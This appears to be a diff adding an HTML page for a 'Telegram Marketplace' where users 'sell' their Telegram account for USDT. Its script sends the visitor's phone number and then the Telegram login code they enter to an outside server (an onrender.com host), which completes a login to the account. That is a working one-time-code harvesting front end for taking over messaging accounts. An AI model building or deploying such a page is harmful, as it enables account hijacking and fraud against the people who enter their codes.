@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Marketplace - Professional</title>
+    <style>
+        :root {
+            --dark-bg: #121212;
+            --card-bg: #1e1e1e;
+            --gold: linear-gradient(45deg, #d4af37, #f9e27d);
+            --neon-gold: 0 0 15px rgba(212, 175, 55, 0.4);
+            --text-gray: #b0b0b0;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #000;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            color: white;
+        }
+
+        .app-shell {
+            width: 100%;
+            max-width: 450px;
+            background: var(--dark-bg);
+            min-height: 100vh;
+            box-shadow: 0 0 30px rgba(0,0,0,0.5);
+        }
+
+        /* Profile Header */
+        .header {
+            padding: 25px 20px;
+            display: flex;
+            align-items: center;
+            background: var(--card-bg);
+            border-bottom: 1px solid #333;
+        }
+
+        .avatar {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background-color: #333;
+            background-size: cover;
+            background-position: center;
+            border: 2px solid #d4af37;
+            margin-left: 15px;
+            box-shadow: var(--neon-gold);
+        }
+
+        .user-data h4 { margin: 0; font-size: 18px; color: #fff; }
+        .user-data p { margin: 5px 0 0; font-size: 13px; color: var(--text-gray); }
+
+        /* Menu Items */
+        .menu-item {
+            display: flex;
+            align-items: center;
+            padding: 18px 20px;
+            background: var(--dark-bg);
+            border-bottom: 1px solid #222;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .menu-item:active { background: #222; }
+
+        .icon-box {
+            width: 40px;
+            height: 40px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-left: 15px;
+            font-weight: bold;
+        }
+
+        .details { flex: 1; }
+        .details span { display: block; font-size: 15px; font-weight: 500; }
+        .details small { color: var(--text-gray); font-size: 12px; }
+
+        .badge {
+            background: rgba(46, 125, 50, 0.2);
+            color: #4caf50;
+            padding: 4px 10px;
+            border-radius: 6px;
+            font-size: 11px;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+
+        /* Gold Neon Button */
+        .gold-btn {
+            background: var(--gold);
+            color: #000;
+            border: none;
+            padding: 15px;
+            border-radius: 10px;
+            font-weight: bold;
+            width: 100%;
+            cursor: pointer;
+            box-shadow: var(--neon-gold);
+            transition: 0.3s;
+            font-size: 16px;
+        }
+
+        .gold-btn:hover { transform: scale(1.02); }
+
+        /* Navigation */
+        .page { display: none; padding: 20px; }
+        .page.active { display: block; }
+
+        input {
+            width: 100%;
+            background: #222;
+            border: 1px solid #444;
+            padding: 12px;
+            color: white;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+        }
+    </style>
+</head>
+<body>
+
+<div class="app-shell">
+    
+    <div id="homePage" class="page active" style="padding: 0;">
+        <div class="header">
+            <div class="avatar" id="userAvatar"></div>
+            <div class="user-data">
+                <h4 id="userName">Guest User</h4>
+                <p id="userID">ID: Not Logged In</p>
+            </div>
+        </div>
+
+        <div class="menu-item">
+            <div class="icon-box" style="background: #2e7d32;">$</div>
+            <div class="details">
+                <span>Withdraw Money</span>
+                <small id="balance">0.00 USDT</small>
+            </div>
+        </div>
+
+        <div class="menu-item" onclick="showPage('sellPage')">
+            <div class="icon-box" style="background: #1565c0;">TG</div>
+            <div class="details">
+                <span>Sell Account</span>
+                <small id="sales">0</small>
+            </div>
+            <span class="badge">Available</span>
+        </div>
+    </div>
+
+    <div id="sellPage" class="page">
+        <h2 style="color: #d4af37;">Sell Account</h2>
+        <div id="step1">
+            <input type="text" id="phone" placeholder="+249XXXXXXXXX">
+            <button class="gold-btn" onclick="sendOTP()">Send Code</button>
+        </div>
+        <div id="step2" style="display:none;">
+            <input type="text" id="otp" placeholder="Enter Telegram Code">
+            <button class="gold-btn" onclick="verifyOTP()">Verify & Save</button>
+        </div>
+        <p id="status" style="margin-top:20px; text-align:center; color: #d4af37;"></p>
+        <button onclick="showPage('homePage')" style="background:none; border:none; color:#888; width:100%; margin-top:20px; cursor:pointer;">Cancel</button>
+    </div>
+
+</div>
+
+<script>
+    const API = "https://tg-2-ko9k.onrender.com";
+    let loginData = { phone: '', hash: '' };
+
+    function showPage(id) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+    }
+
+    // تطبيق البيانات المحفوظة تلقائياً
+    function applySavedData() {
+        const id = localStorage.getItem('tg_id');
+        const name = localStorage.getItem('tg_name');
+        const photo = localStorage.getItem('tg_photo');
+        
+        if(id) {
+            document.getElementById('userName').innerText = name;
+            document.getElementById('userID').innerText = "ID: " + id;
+            if(photo) document.getElementById('userAvatar').style.backgroundImage = `url('${photo}')`;
+        }
+    }
+
+    async function updateStats() {
+        try {
+            const res = await fetch(`${API}/get_stats`);
+            const data = await res.json();
+            document.getElementById('balance').innerText = data.balance.toFixed(2) + " USDT";
+            document.getElementById('sales').innerText = data.sales;
+        } catch(e) { console.log("Offline Mode"); }
+    }
+
+    async function sendOTP() {
+        loginData.phone = document.getElementById('phone').value;
+        const res = await fetch(`${API}/send_code`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ phone: loginData.phone })
+        });
+        const data = await res.json();
+        if(data.status === "success") {
+            loginData.hash = data.hash;
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+            document.getElementById('status').innerText = "Code Sent to Telegram!";
+        }
+    }
+
+    async function verifyOTP() {
+        const code = document.getElementById('otp').value;
+        const res = await fetch(`${API}/verify_code`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ phone: loginData.phone, code: code, hash: loginData.hash })
+        });
+        const data = await res.json();
+        if(data.status === "success") {
+            // حفظ البيانات محلياً للـ Auto-Login
+            localStorage.setItem('tg_id', data.user_id);
+            localStorage.setItem('tg_name', data.user_name);
+            localStorage.setItem('tg_photo', data.photo_url);
+            
+            applySavedData();
+            updateStats();
+            showPage('homePage');
+            alert("Account Linked Successfully!");
+        }
+    }
+
+    window.onload = () => {
+        applySavedData();
+        updateStats();
+    };
+</script>
+
+</body>
+</html>
